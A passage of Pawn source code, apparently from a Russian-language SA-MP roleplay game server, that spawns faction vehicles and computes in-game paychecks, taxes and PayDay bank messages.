	CreateVehicle(552,-1003.5901,-663.8214,31.7005,90.1988,158,158,900);
	CreateVehicle(552,-1003.5901,-668.9190,31.7005,90.1988,158,158,900);
	CreateVehicle(552,-1003.5901,-673.9647,31.7005,90.1988,158,158,900);
	comptruck[3] = CreateVehicle(552,-1003.5901,-679.0637,31.7005,90.1988,158,158,900);
	//==================================================
	comptruck[4] = CreateVehicle(456,-564.5070190,-499.7539978,25.7730007,0.0000000,158,158,600); //Yankee
	CreateVehicle(456,-572.6339722,-499.5740051,25.7730007,0.0000000,158,158,600); //Yankee
	CreateVehicle(456,-580.6370239,-499.4070129,25.7730007,0.0000000,158,158,600); //Yankee
	CreateVehicle(456,-513.9760132,-497.6239929,25.7730007,0.0000000,158,158,600); //Yankee
	CreateVehicle(456,-506.7680054,-497.7059937,25.7730007,0.0000000,158,158,600); //Yankee
	CreateVehicle(456,-525.3140259,-473.6199951,25.7730007,180.0000000,158,158,600); //Yankee
	comptruck[5] = CreateVehicle(456,-519.6179810,-473.6579895,25.7730007,180.0000000,158,158,600); //Yankee
	//=================================================
	comptruck[6] = CreateVehicle(459,-589.4689941,-472.4060059,25.6630001,180.0000000,158,158,600); //Berkley's RC Van
	CreateVehicle(459,-584.4240112,-472.4230042,25.6630001,180.0000000,158,158,600); //Berkley's RC Van
	CreateVehicle(459,-579.6480103,-472.4309998,25.6630001,180.0000000,158,158,600); //Berkley's RC Van
	CreateVehicle(459,-574.5529785,-472.6730042,25.6630001,180.0000000,158,158,600); //Berkley's RC Van
	CreateVehicle(459,-569.5980225,-472.7479858,25.6630001,180.0000000,158,158,600); //Berkley's RC Van
	CreateVehicle(459,-564.7299805,-472.7860107,25.6630001,180.0000000,158,158,600); //Berkley's RC Van
	CreateVehicle(459,-559.6040039,-472.8989868,25.6630001,180.0000000,158,158,600); //Berkley's RC Van
	CreateVehicle(459,-554.5050049,-472.7080078,25.6630001,180.0000000,158,158,600); //Berkley's RC Van
	CreateVehicle(459,-549.6040039,-472.6359863,25.6630001,180.0000000,158,158,600); //Berkley's RC Van
	comptruck[7] = CreateVehicle(459,-544.3560181,-472.6069946,25.6630001,180.0000000,158,158,600); //Berkley's RC Van
	//=========================================
	comptruck[8] = CreateVehicle(455,-550.0939941,-498.9030151,26.0930004,0.0000000,158,158,600); //Flatbed
	CreateVehicle(455,-542.8229980,-498.9909973,26.0879993,0.0000000,158,158,600); //Flatbed
	CreateVehicle(455,-535.8569946,-499.0629883,26.0879993,0.0000000,158,158,600); //Flatbed
	CreateVehicle(455,-494.4660034,-473.4410095,26.0930004,180.0000000,158,158,600); //Flatbed
	CreateVehicle(455,-510.3970032,-473.2850037,26.0930004,180.0000000,158,158,600); //Flatbed
	CreateVehicle(455,-504.7879944,-473.7000122,26.0930004,180.0000000,158,158,600); //Flatbed
	comptruck[9] = CreateVehicle(455,-499.4039917,-473.5020142,26.0930004,180.0000000,158,158,600); //Flatbed

	//
	/*CreateVehicle(584,-984.8389,-635.7936,33.1543,91.1889,1,1,600); // Pricep 0
	CreateVehicle(584,-984.7327,-640.9091,33.1543,91.1889,1,1,600); // Pricep 1
	CreateVehicle(584,-984.6266,-646.0191,33.1543,91.1889,1,1,600); // Pricep 2
	CreateVehicle(584,-984.5270,-650.8137,33.1543,91.1889,1,1,600); // Pricep 3
	CreateVehicle(584,-984.4152,-656.2086,33.1543,91.1889,1,1,600); // Pricep 4
	CreateVehicle(584,-984.3068,-661.4308,33.1543,91.1889,1,1,600); // Pricep 5*/
	//============================== Army SFA ==================================
	armycarsf[0] = CreateVehicle(470,-1372.8979,456.3182,7.2294,0.0551,43,0,300); //
	armycarsf[1] = CreateVehicle(470,-1367.1285,456.2757,7.2231,358.5934,43,0,300); //
	armycarsf[2] = CreateVehicle(470,-1361.4867,456.2256,7.2231,0.0238,43,0,300); //
	armycarsf[3] = CreateVehicle(470,-1356.2032,456.0864,7.2069,359.3690,43,0,300); //
	armycarsf[4] = CreateVehicle(470,-1351.0299,456.0008,7.2096,1.1598,43,0,300); //
	armycarsf[5] = CreateVehicle(497,-1419.3746,492.2733,18.3684,319.9491,114,114,300); //
	armycarsf[6] = CreateVehicle(497,-1429.5170,492.2914,18.4132,318.3365,114,114,300); //
	armycarsf[7] = CreateVehicle(497,-1439.3555,491.4513,18.4119,304.5855,114,114,300); //
	armycarsf[8] = CreateVehicle(497,-1288.3950,492.2805,18.3670,319.9007,114,114,300); //
	armycarsf[9] = CreateVehicle(497,-1277.4031,492.2775,18.3779,319.9335,114,114,300); //
	armycarsf[10] = CreateVehicle(497,-1266.3956,492.2798,18.3594,319.9319,114,114,300); //
	armycarsf[11] = CreateVehicle(563,-1412.0380,517.2639,18.9804,269.4886,114,114,300); //
	armycarsf[12] = CreateVehicle(563,-1451.4536,508.1552,18.9380,270.4318,16,16,300);
	armycarsf[13] = CreateVehicle(563,-1451.6771,496.4147,18.9736,268.8331,16,16,300);
	armycarsf[14] = CreateVehicle(430,-1446.0490,495.2742,-0.3646,90.9461,114,114,300); //
	armycarsf[15] = CreateVehicle(430,-1439.4580,508.3202,-0.1360,90.6253,114,114,300); //
	armycarsf[16] = CreateVehicle(497,-1408.8306,492.0621,18.4459,316.3108,16,16,300); //
	armycarsf[17] = CreateVehicle(497,-1298.1520,492.3098,18.4036,319.1992,16,16,300); //
	armycarsf[18] = CreateVehicle(500,-1529.4420,428.4619,7.3006,60.6340,104,104,300); // СФа офицерская машина1
	armycarsf[19] = CreateVehicle(500,-1529.5054,432.6239,7.2803,62.0111,104,104,300); // СФа офицерская машина2
	armycarsf[20] = CreateVehicle(500,-1529.4598,437.0796,7.2786,61.1766,104,104,300); // СФа офицерская машина3
	armycarsf[21] = CreateVehicle(470,-1529.9104,444.0081,7.2165,66.3885,43,0,300); // СФа хаммер1
	armycarsf[22] = CreateVehicle(470,-1529.9207,449.6951,7.2155,66.2135,43,0,300); // СФа хаммер2
	armycarsf[23] = CreateVehicle(470,-1529.4401,456.4871,7.2149,66.2166,43,0,300); // СФа хаммер3
	//
	armycarsf[24] = CreateVehicle(548,-1265.3256,441.1673,8.6963,37.6728,1,1,300); //
	armycarsf[25] = CreateVehicle(548,-1241.4851,441.2180,8.6613,37.6573,1,1,300); //
	armycarsf[26] = CreateVehicle(548,-1545.3065,378.2518,8.8687,59.1481,1,1,300); // маталёт СФа1
	armycarsf[27] = CreateVehicle(548,-1543.1077,396.6814,8.6623,60.8959,1,1,300); // маталёт СФа2
	armycarsf[28] = CreateVehicle(548,-1544.2885,416.1112,8.7020,58.6729,1,1,300); // маталёт СФа3
	//================================ Aztecas =================================
	if(BestGang == 17)
	{
		coronoscar[0] = CreateVehicle(559,1683.5426,-2106.7378,13.4090,222.9584,2,2,300); //
		coronoscar[1] = CreateVehicle(559,1688.2424,-2106.2634,13.3694,217.0592,2,2,300); //
		coronoscar[2] = CreateVehicle(560,1693.9329,-2106.2261,13.2552,218.1066,2,2,300); //
		coronoscar[3] = CreateVehicle(559,1682.8170,-2119.2500,13.4180,324.9712,2,2,300); //
		coronoscar[4] = CreateVehicle(559,1688.1665,-2119.5271,13.3934,323.0140,2,2,300); //
		coronoscar[5] = CreateVehicle(560,1693.9672,-2119.5586,13.2570,327.8052,2,2,300); //
	}
	else
	{
		coronoscar[0] = CreateVehicle(567,1683.5426,-2106.7378,13.4090,222.9584,2,2,300); //
		coronoscar[1] = CreateVehicle(567,1688.2424,-2106.2634,13.3694,217.0592,2,2,300); //
		coronoscar[2] = CreateVehicle(534,1693.9329,-2106.2261,13.2552,218.1066,2,2,300); //
		coronoscar[3] = CreateVehicle(567,1682.8170,-2119.2500,13.4180,324.9712,2,2,300); //
		coronoscar[4] = CreateVehicle(567,1688.1665,-2119.5271,13.3934,323.0140,2,2,300); //
		coronoscar[5] = CreateVehicle(534,1693.9672,-2119.5586,13.2570,327.8052,2,2,300); //
	}
	coronoscar[6] = CreateVehicle(478,1698.8173,-2119.5869,13.5725,328.3069,2,2,300); //
	matsfuraactek[0] = CreateVehicle(482,1663.2980,-2111.2231,13.7082,268.6700,2,2,300); //
	//================================= Vagos ==================================
	if(BestGang == 13)
	{
		vagoscar[1] = CreateVehicle(559,2795.9553,-1610.1245,10.7588,340.7462,6,6,300); //
		vagoscar[2] = CreateVehicle(560,2788.8394,-1623.8651,10.6340,342.9400,6,6,300); //
		vagoscar[3] = CreateVehicle(560,2784.0303,-1623.9258,10.6507,339.3192,6,6,300); //
		vagoscar[4] = CreateVehicle(560,2779.0093,-1623.9851,10.7474,339.0358,6,6,300); //
		vagoscar[5] = CreateVehicle(559,2771.9956,-1614.9314,10.6763,266.4161,6,6,300); //
		vagoscar[6] = CreateVehicle(559,2771.9324,-1606.5508,10.6763,271.6363,6,6,300); //
	}
	else
	{
		vagoscar[1] = CreateVehicle(467,2795.9553,-1610.1245,10.7588,340.7462,6,6,300); //
		vagoscar[2] = CreateVehicle(474,2788.8394,-1623.8651,10.6340,342.9400,6,6,300); //
		vagoscar[3] = CreateVehicle(474,2784.0303,-1623.9258,10.6507,339.3192,6,6,300); //
		vagoscar[4] = CreateVehicle(474,2779.0093,-1623.9851,10.7474,339.0358,6,6,300); //
		vagoscar[5] = CreateVehicle(467,2771.9956,-1614.9314,10.6763,266.4161,6,6,300); //
		vagoscar[6] = CreateVehicle(467,2771.9324,-1606.5508,10.6763,271.6363,6,6,300); //
	}
	vagoscar[0] = CreateVehicle(478,2799.3738,-1601.1837,10.9366,337.5052,6,6,300); //
	matsfuravagos[0] = CreateVehicle(482,2783.9197,-1602.8109,11.0728,272.5069,6,6,300); //
	//================================== Groove Street =========================
	if(BestGang == 15)
	{
		grovecar[0] = CreateVehicle(559,2486.7966,-1680.8181,13.0737,333.6607,86,86,300); //
		grovecar[1] = CreateVehicle(559,2491.7046,-1680.7976,13.0737,334.3098,86,86,300); //
		grovecar[2] = CreateVehicle(560,2496.9080,-1680.3524,13.0735,335.0397,86,86,300); //
		grovecar[3] = CreateVehicle(560,2501.9385,-1679.2141,13.0989,335.7959,86,86,300); //
		grovecar[5] = CreateVehicle(560,2509.4780,-1672.3363,13.1738,344.9109,86,86,300); //
		grovecar[6] = CreateVehicle(560,2501.7820,-1655.2679,13.2270,65.6726,86,86,300); //
	}
	else
	{
		grovecar[0] = CreateVehicle(600,2486.7966,-1680.8181,13.0737,333.6607,86,86,300); //
		grovecar[1] = CreateVehicle(600,2491.7046,-1680.7976,13.0737,334.3098,86,86,300); //
		grovecar[2] = CreateVehicle(492,2496.9080,-1680.3524,13.0735,335.0397,86,86,300); //
		grovecar[3] = CreateVehicle(492,2501.9385,-1679.2141,13.0989,335.7959,86,86,300); //
		grovecar[5] = CreateVehicle(466,2509.4780,-1672.3363,13.1738,344.9109,86,86,300); //
		grovecar[6] = CreateVehicle(466,2501.7820,-1655.2679,13.2270,65.6726,86,86,300); //
	}
	grovecar[4] = CreateVehicle(478,2510.8867,-1687.7504,13.5679,48.9183,86,86,300); //
	matsfuragrove[0] = CreateVehicle(482,2505.7532,-1694.3616,13.7021,1.8562,86,86,300); //
	//================================= Rifa ===================================
	if(BestGang == 18)
	{
		rifacar[0] = CreateVehicle(560,2189.7805,-1808.5282,13.0284,44.9485,12,12,300); //
		rifacar[1] = CreateVehicle(560,2189.8374,-1802.9955,13.0298,47.5496,12,12,300); //
		rifacar[2] = CreateVehicle(560,2190.1440,-1797.8789,13.0248,50.6026,12,12,300); //
		rifacar[3] = CreateVehicle(559,2160.0256,-1791.0026,13.1429,221.5456,12,12,300); //
		rifacar[4] = CreateVehicle(559,2166.0771,-1790.7765,13.1544,215.7416,12,12,300); //
		rifacar[5] = CreateVehicle(559,2171.5010,-1790.6405,13.1558,210.6204,12,12,300); //
	}
	else
	{
		rifacar[0] = CreateVehicle(529,2189.7805,-1808.5282,13.0284,44.9485,12,12,300); //
		rifacar[1] = CreateVehicle(529,2189.8374,-1802.9955,13.0298,47.5496,12,12,300); //
		rifacar[2] = CreateVehicle(529,2190.1440,-1797.8789,13.0248,50.6026,12,12,300); //
		rifacar[3] = CreateVehicle(518,2160.0256,-1791.0026,13.1429,221.5456,12,12,300); //
		rifacar[4] = CreateVehicle(518,2166.0771,-1790.7765,13.1544,215.7416,12,12,300); //
		rifacar[5] = CreateVehicle(518,2171.5010,-1790.6405,13.1558,210.6204,12,12,300); //
	}
	rifacar[6] = CreateVehicle(478,2189.2041,-1779.6462,13.3840,359.1770,12,12,300); //
	matsfurarifa[0] = CreateVehicle(482,2189.5154,-1788.6223,13.5916,1.1480,12,12,300); //
	//================================== Ballas ================================
	if(BestGang == 12)
	{
		ballascar[0] = CreateVehicle(559,2651.8391,-2009.8727,13.3967,315.1838,85,85,300); //
		ballascar[1] = CreateVehicle(560,2657.2664,-2009.8159,13.3387,317.1115,85,85,300); //
		ballascar[2] = CreateVehicle(560,2663.0969,-2010.3190,13.2869,314.5558,85,85,300); //
		ballascar[3] = CreateVehicle(559,2660.5706,-1998.9375,13.3396,271.3958,85,85,300); //
		ballascar[5] = CreateVehicle(560,2657.6587,-2042.5701,13.3732,0.0457,85,85,300); //
		ballascar[6] = CreateVehicle(560,2652.5093,-2042.6674,13.4114,0.8379,85,85,300); //
	}
	else
	{
		ballascar[0] = CreateVehicle(412,2651.8391,-2009.8727,13.3967,315.1838,85,85,300); //
		ballascar[1] = CreateVehicle(566,2657.2664,-2009.8159,13.3387,317.1115,85,85,300); //
		ballascar[2] = CreateVehicle(566,2663.0969,-2010.3190,13.2869,314.5558,85,85,300); //
		ballascar[3] = CreateVehicle(412,2660.5706,-1998.9375,13.3396,271.3958,85,85,300); //
		ballascar[5] = CreateVehicle(516,2657.6587,-2042.5701,13.3732,0.0457,85,85,300); //
		ballascar[6] = CreateVehicle(516,2652.5093,-2042.6674,13.4114,0.8379,85,85,300); //
	}
	ballascar[4] = CreateVehicle(478,2654.4734,-2032.6144,13.5646,88.3298,85,85,300); //
	matsfura[0] = CreateVehicle(482,2643.5286,-2034.7474,13.7096,1.4741,85,85,300); //
	//============================== Zone 51 ===================================
	armcar[0] = CreateVehicle(425,288.2651,1926.6296,18.2273,234.2757,43,0,300); // Вертолёт
	armcar[1] = CreateVehicle(432,274.4523,2028.4375,17.6701,273.3803,43,0,300); // Танк1
	armcar[2] = CreateVehicle(432,275.2092,2018.6259,17.6701,271.0416,43,0,300); // Танк2
	armcar[3] = CreateVehicle(520,314.0189,2052.2217,18.3639,178.2361,0,0,300); // Гидра1
	armcar[4] = CreateVehicle(520,301.3591,2052.3447,18.3641,180.6737,0,0,300); // Гидра2

	armcar[5] = CreateVehicle(500,171.9643,1985.2101,20.0327,272.8705,104,104,300); // Офицерка1
	armcar[6] = CreateVehicle(500,172.3277,1977.7632,20.0315,271.3475,104,104,300); // Офицерка2
	armcar[7] = CreateVehicle(500,172.7048,1971.4012,20.0327,271.9554,104,104,300); // Офицерка3
	armcar[8] = CreateVehicle(500,173.0402,1964.1332,20.0327,271.6519,104,104,300); // Офицерка4
	armcar[9] = CreateVehicle(500,173.1927,1957.4496,20.0352,266.1950,104,104,300); // Офицерка5
	armcar[10] = CreateVehicle(500,204.0586,1864.4587,13.2768,270.0730,104,104,300); // Офицерка6
	
	armcar[11] = CreateVehicle(497,144.9689,1950.7150,29.1754,359.9992,44,44,300); // Вертолёт1
	armcar[12] = CreateVehicle(497,135.1045,1950.7152,29.1515,359.9985,44,44,300); // Вертолёт2
	armcar[13] = CreateVehicle(470,274.4998,2000.2352,17.6635,270.6053,43,0,300); // Хаммер1
	armcar[14] = CreateVehicle(470,274.4998,1977.9254,17.6636,272.9563,43,0,300);  // Хаммер2
	armcar[15] = CreateVehicle(470,291.5294,1862.1636,17.6638,302.1345,43,0,300); // Хаммер3
	armcar[16] = CreateVehicle(470,291.6763,1856.2782,17.6637,306.9750,43,0,300); // Хаммер4

	armcar[17] = CreateVehicle(500,204.0860,1860.5779,13.2764,269.2042,104,104,300); //Офицерка7
	armcar[18] = CreateVehicle(500,213.4052,1853.8899,13.0006,5.2460,104,104,300); //Офицерка8
	armcar[19] = CreateVehicle(500,217.5131,1854.0115,12.9380,2.5356,104,104,300); //Офицерка9
	armcar[20] = CreateVehicle(500,221.8128,1854.3396,12.9634,1.1313,104,104,300); //Офицерка10

	armcar[21] = CreateVehicle(470,291.5849,1850.1697,17.6634,309.7867,43,0,300); //Хаммер5
	armcar[22] = CreateVehicle(470,185.4194,1957.4232,19.9258,91.0215,43,0,300); //Хаммер6
	armcar[23] = CreateVehicle(470,185.5673,1964.4274,19.9258,91.1489,43,0,300); //Хаммер7
	armcar[24] = CreateVehicle(470,185.3878,1971.6453,19.9258,89.2016,43,0,300); //Хаммер8
	armcar[25] = CreateVehicle(470,185.1143,1978.1036,19.9279,91.6780,43,0,300); //Хаммер9
	armcar[26] = CreateVehicle(470,185.2467,1985.6477,19.9243,90.5737,43,0,300); //Хаммер10

	gunscar[0] = CreateVehicle(433,274.4942,1995.3737,18.0603,272.5592,43,0,300); // Матовоз1
	gunscar[1] = CreateVehicle(433,274.4942,1991.1019,18.0603,272.4530,43,0,300); // Матовоз2
	gunscar[2] = CreateVehicle(433,274.4942,1986.8715,18.0604,272.7024,43,0,300); // Матовоз3
	gunscar[3] = CreateVehicle(433,274.4942,1982.7965,18.0602,273.9871,43,0,300); // Матовоз4
	gunscar[4] = CreateVehicle(433,275.6978,1961.1805,18.1065,272.9075,43,0,300); // Матовоз5
	gunscar[5] = CreateVehicle(433,276.3318,1955.3665,18.1065,273.6414,43,0,300); // Матовоз6
	gunscar[6] = CreateVehicle(433,276.7726,1949.7548,18.1064,271.6631,43,0,300); // Матовоз7
	//============================== Мопеды на АШ ==============================
	faggio[0] = CreateVehicle(462,-2020.8462,-90.1184,34.9213,159.0164,1,1,240); // Faggio 0
	faggio[1] = CreateVehicle(462,-2022.5684,-90.0082,34.9226,161.6525,1,1,240); // Faggio 1
	faggio[2] = CreateVehicle(462,-2025.9767,-89.8600,34.9237,156.5267,1,1,240); // Faggio 2
	faggio[3] = CreateVehicle(462,-2024.1243,-89.9715,34.9227,163.0753,1,1,240); // Faggio 3
	faggio[4] = CreateVehicle(462,-2029.3910,-90.0002,34.9205,158.7377,1,1,240); // Faggio 4
	faggio[5] = CreateVehicle(462,-2027.5295,-89.8887,34.9048,155.6873,1,1,240); // Faggio 5
	//============================= Лодки ========================================
	CreateVehicle(452,739.6006,-1667.2963,-0.5654,177.2428,1,35,300); // лодка 1
	CreateVehicle(452,720.1100,-1693.0873,-0.3042,178.8085,1,22,300); // лодка 2
	CreateVehicle(452,721.1708,-1628.0481,-0.5770,181.3787,1,44,300); // лодка 3
	return true;
}
publics: GetClosestforeach(p1)
{
	new Float:dis,Float:dis2,player;
	player = -1;
	dis = 99999.99;
	foreach(x)
	{
		if(x != p1)
		{
			dis2 = GetDistanceBetweenPlayers(x,p1);
			if(dis2 < dis && dis2 != -1.00)
			{
				dis = dis2;
				player = x;
			}
		}
	}
	return player;
}
stock PayChecks(i)
{
	if(PlayerInfo[i][pZakonp] < 100) PlayerInfo[i][pZakonp]++;
	if(!GetPVarInt(i,"Fraction_Duty")) return 0;
	switch(PlayerInfo[i][pMember])
	{
	case 1..4,7,10,11,19,22,21:
		{
			if(FracBank[0][fKazna] <=0)
			{
				SCM(i, COLOR_GREY, " [Мэрия] Казна штата пуста, зарплаты нет...");
				return 0;
			}
		}
	}
	if(PlayerInfo[i][pMember] == 7)
	{
		switch(PlayerInfo[i][pRank])
		{
		case 1,2: return 6000; case 3: return 8000;
		case 4: return 10000; case 5: return 16000;
		case 6: return 20000;
		}
	}
	else if(PlayerInfo[i][pMember] == 2)
	{
		switch(PlayerInfo[i][pRank])
		{
		case 1: return 6000;
		case 2..10: return 6000+(PlayerInfo[i][pRank]*1000);
		}
	}
	else if(PlayerInfo[i][pMember] == 1 || PlayerInfo[i][pMember] == 10 || PlayerInfo[i][pMember] == 21) return 4500+(PlayerInfo[i][pRank]*500);
	else if(PlayerInfo[i][pMember] == 3 || PlayerInfo[i][pMember] == 19) return 2500+(PlayerInfo[i][pRank]*500);
	else if(PlayerInfo[i][pMember] == 4)
	{
		switch(PlayerInfo[i][pRank])
		{
		case 1..8: return 2000+(PlayerInfo[i][pRank]*500);
		case 9: return 8000;
		case 10: return 10000;
		}
	}
	else if(IsAMafia(i)) return 2500+(PlayerInfo[i][pRank]*1000);
	else if(PlayerInfo[i][pMember] == 11) return 1500*PlayerInfo[i][pRank];
	else if(IsAGang(i))
	{
		new null = 0;
		for(new idx = 1; idx <= TOTALGZ; idx++) if(GZInfo[idx][gFrakVlad] == PlayerInfo[i][pMember]) null++;
		return null*50;
	}
	else if(PlayerInfo[i][pMember] == 9 || PlayerInfo[i][pMember] == 16 || PlayerInfo[i][pMember] == 20)
	{
	    new null = 0;
	    switch(PlayerInfo[i][pMember])
	    {
	        case 9: null = newsZP[1];
	        case 16: null = newsZP[0];
			case 20: null = newsZP[2];
	    }
		return (PlayerInfo[i][pRank] * null + null);
	}
	return 0;
}
stock PayDay()
{
	for(new i = 0; i < 20; i++) FrakCD[i] = 0;
	for(new i = 1; i <= TOTALGZ; i++)
	{
		if(GZInfo[i][gFrakVlad] == 12) TotalGzB++;
		if(GZInfo[i][gFrakVlad] == 13) TotalGzV++;
		if(GZInfo[i][gFrakVlad] == 15) TotalGzG++;
		if(GZInfo[i][gFrakVlad] == 17) TotalGzA++;
		if(GZInfo[i][gFrakVlad] == 18) TotalGzR++;
	}
	FracBank[0][fBallas] += TotalGzB*50;
	FracBank[0][fVagos] += TotalGzV*50;
	FracBank[0][fGrove] += TotalGzG*50;
	FracBank[0][fRifa] += TotalGzR*50;
	FracBank[0][fAztek] += TotalGzA*50;
	ClearTotalGz();
	SetSVarInt("capture", gettime() + 600);
	//
	GetBizz();
	GetHome();
	GetShop();
	GetKvart();
	GetFarm();
	//
	if(armmatbi < 0) armmatbi = 0;
	if(armmatsf < 0) armmatsf = 0;
	foreach(i)
	{
		if(!IsPlayerConnected(i)) return true;
		if(PlayerInfo[i][pLogin] == 0) continue;
		if(PlayerInfo[i][pMin] < 20)
		{
			 SCM(i, COLOR_GREY, "Для получения опыта нужно отыграть 20 минут!");
			 return true;
		}
		else
		{
			new b = PlayerInfo[i][pPBizzKey];
			PlayerInfo[i][pPayCheck] = PayChecks(i);
			DeletePVar(i,"_Hel");
			new expamount = (PlayerInfo[i][pLevel] + 1) * 4;
			PlayerInfo[i][ptaxiexp] += taxiexpp[i];
			if(booston == 0) PlayerInfo[i][pExp]++;
			else if(booston == 1)
			{
				PlayerInfo[i][pExp] += 3;
				if(PlayerInfo[i][pExp] > expamount)
				PlayerInfo[i][pExp] = expamount;
			}
			//if(PlayerInfo[i][pMember] == 3 && armmatbi <= 0) PlayerInfo[i][pPayCheck] = 0, SCM(i, COLOR_GRAD1, "Склад Армии LV пуст!");
			//if(PlayerInfo[i][pMember] == 19 && armmatsf <= 0) PlayerInfo[i][pPayCheck] = 0, SCM(i, COLOR_GRAD1, "Склад Армии SF пуст!");
			new checks = PlayerInfo[i][pPayCheck];
			if(PlayerInfo[i][pDonateRank] > 0) format(string, 20, "PayDay");
			else format(string, 20, "~w~PayDay");
			GameTextForPlayer(i, string, 5000, 1);
			if(PlayerInfo[i][pAdmin] > 0) PlayerInfo[i][pBank] += 60000;
			if(PlayerInfo[i][pHelper] == 1 && SDuty[i] == 1) PlayerInfo[i][pBank] += 30000;
			if(PlayerInfo[i][pDonateRank] > 0) SCM(i, COLOR_GOLD, "--------===[ VIP КЛИЕНТ БАНКА SA ]===-------");
			else SCM(i, COLOR_GRAD1, "--------===[ КЛИЕНТ БАНКА SA ]===-------");
			if(PlayerInfo[i][pPayCheck] >= 500)
			{
				format(string, 128, "***** Налог государству: -%i вирт *****",PlayerInfo[i][pPayCheck]/10);
				SCM(i, 0xFF8C37AA, string);
				PlayerInfo[i][pBank] -= PlayerInfo[i][pPayCheck]/10;
				FracBank[0][fKazna] += checks/10;
			}
			else if(PlayerInfo[i][pPayCheck] <= 500)
			{
				format(string, 128, "***** Налог государству: -0 вирт *****"),
				SCM(i, 0xFF8C37AA, string);
			}
			if(PlayerInfo[i][pBank] > 50 && PlayerInfo[i][pKrisha] != 0) PlayerInfo[i][pBank] -= 50, PlayerInfo[i][pDolg] += 50;
			if(PlayerInfo[i][pCash] > 50 && PlayerInfo[i][pKrisha] != 0) PlayerInfo[i][pCash] -= 50, PlayerInfo[i][pDolg] += 50;
			format(string, 128, " Счёт за телефон: -%i вирт", PlayerInfo[i][pMobile]);
			SCM(i, 0xFF8C37AA, string);
			PlayerInfo[i][pBank]-=PlayerInfo[i][pMobile];
			PlayerInfo[i][pMobile] = 0;
			if(PlayerInfo[i][pDonateRank]) SCM(i, COLOR_GOLD, " ");
			else SCM(i, -1, " ");
			switch(PlayerInfo[i][pMember])
			{
			case 1,10,21: format(string, 128, " Зарплата Полиции: %i вирт", checks);
			case 3,19: format(string, 128, " Зарплата Армии: %i вирт", checks);
			case 2: format(string, 128, " Зарплата ФБР: %i вирт", checks);
			case 7: format(string, 128, " Зарплата Мэрии: %i вирт", checks);
			case 4,22: format(string, 128, " Зарплата Медиков: %i вирт", checks);
			case 11: format(string, 128, " Зарплата Автошколы: %i вирт", checks);
			case 5,6,14: format(string, 128, " Зарплата организации: %i вирт", checks);
			case 12,13,15,17,18: format(string, 128, " Зарплата Бандитов: %i вирт", checks);
			default: format(string, 128, " Зарплата: %i вирт", checks);
			}
			if(PlayerInfo[i][pDonateRank] > 0) SCM(i, COLOR_GOLD, string);
			else SCM(i, -1, string);
			PlayerInfo[i][pBank] += checks;
			checks = 0;
			/*new interest;
			if(PlayerInfo[i][pDonateRank] > 0) interest = (PlayerInfo[i][pBank]/10000)*5;
			else interest = (PlayerInfo[i][pBank]/10000)*2;*/
			/*if(interest > 0)
			{
				if(PlayerInfo[i][pDonateRank] > 0) format(string, 128, " Полученый процент: %i вирт",interest), SCM(i, COLOR_GOLD, string);
				else format(string, 128, " Полученый процент: %i вирт",interest), SCM(i, -1, string);
				PlayerInfo[i][pBank]+=interest;
			}*/
			if(PlayerInfo[i][pDonateRank] > 0) format(string, 128, " Текущий баланс: %i вирт", PlayerInfo[i][pBank]), SCM(i, COLOR_GOLD, string);
			else format(string, 128, " Текущий баланс: %i вирт", PlayerInfo[i][pBank]), SCM(i, -1, string);
			if(HGet(i))
			{
				if(PlayerInfo[i][pDonateRank]) SendMes(i,COLOR_GOLD," Домашний счёт: %i вирт", HouseInfo[PlayerInfo[i][pPHouseKey]][hTakings]);
				else SendMes(i,-1," Домашний счёт: %i вирт", HouseInfo[PlayerInfo[i][pPHouseKey]][hTakings]);
			}
			if(BGet(i))
			{
				if(PlayerInfo[i][pDonateRank]) SendMes(i,COLOR_GOLD," Плата за электроэнергию: %i вирт",BizzLandTax[b]);
				else SendMes(i,-1," Плата за электроэнергию: %i вирт",BizzLandTax[b]);
				BizzInfo[b][bLandTax] -= BizzLandTax[b];
				BizzPay[b] = 0;
			}
			if(FGet(i))
			{
				FarmStatPayS[PlayerInfo[i][pPFarmKey]][0] = FarmStatPay[PlayerInfo[i][pPFarmKey]][0];
				FarmStatPayS[PlayerInfo[i][pPFarmKey]][1] = FarmStatPay[PlayerInfo[i][pPFarmKey]][1];
				FarmStatPayS[PlayerInfo[i][pPFarmKey]][2] = FarmStatPay[PlayerInfo[i][pPFarmKey]][2];
				FarmStatPayS[PlayerInfo[i][pPFarmKey]][3] = FarmStatPay[PlayerInfo[i][pPFarmKey]][3];
				FarmStatPayS[PlayerInfo[i][pPFarmKey]][4] = FarmStatPay[PlayerInfo[i][pPFarmKey]][4];
				FarmStatPayS[PlayerInfo[i][pPFarmKey]][5] = FarmStatPay[PlayerInfo[i][pPFarmKey]][5];
				FarmStatPayS[PlayerInfo[i][pPFarmKey]][6] = FarmStatPay[PlayerInfo[i][pPFarmKey]][6];
				FarmStatPayS[PlayerInfo[i][pPFarmKey]][7] = FarmStatPay[PlayerInfo[i][pPFarmKey]][7]; // ZP
				FarmStatPayS[PlayerInfo[i][pPFarmKey]][8] = FarmStatPay[PlayerInfo[i][pPFarmKey]][8];
				FarmStatPay[PlayerInfo[i][pPFarmKey]][0] = 0;
				FarmStatPay[PlayerInfo[i][pPFarmKey]][1] = 0;
				FarmStatPay[PlayerInfo[i][pPFarmKey]][2] = 0;
				FarmStatPay[PlayerInfo[i][pPFarmKey]][3] = 0;
				FarmStatPay[PlayerInfo[i][pPFarmKey]][4] = 0;
				FarmStatPay[PlayerInfo[i][pPFarmKey]][5] = 0;
				FarmStatPay[PlayerInfo[i][pPFarmKey]][6] = 0;
				FarmStatPay[PlayerInfo[i][pPFarmKey]][7] = 0;
				FarmStatPay[PlayerInfo[i][pPFarmKey]][8] = 0;
			}
			if(PlayerInfo[i][pDonateRank] == 1)
			{
               if(PlayerInfo[i][pWantedLevel] > 0)
			   {
				   PlayerInfo[i][pWantedLevel] --;
				   SetPlayerWantedLevel(i, PlayerInfo[i][pWantedLevel]);
			   }
			}
			if(PlayerInfo[i][pDonateRank] == 2)
			{
               if(PlayerInfo[i][pWantedLevel] > 0)
			   {
				   PlayerInfo[i][pWantedLevel] --;
				   SetPlayerWantedLevel(i, PlayerInfo[i][pWantedLevel]);
			   }
			}
			if(PlayerInfo[i][pDonateRank] == 3)
			{
                if(PlayerInfo[i][pWantedLevel] > 0)
			    {
				    PlayerInfo[i][pWantedLevel] --;
				    SetPlayerWantedLevel(i, PlayerInfo[i][pWantedLevel]);
			    }
   				PlayerInfo[i][pDonateMoney] += 1;
				SCM(i, COLOR_GOLD, "[VIP GOLD]: Вы получили 1 GOLD COIN!");
		        PlayerInfo[i][pExp] += 2;
				if(PlayerInfo[i][pExp] > expamount)
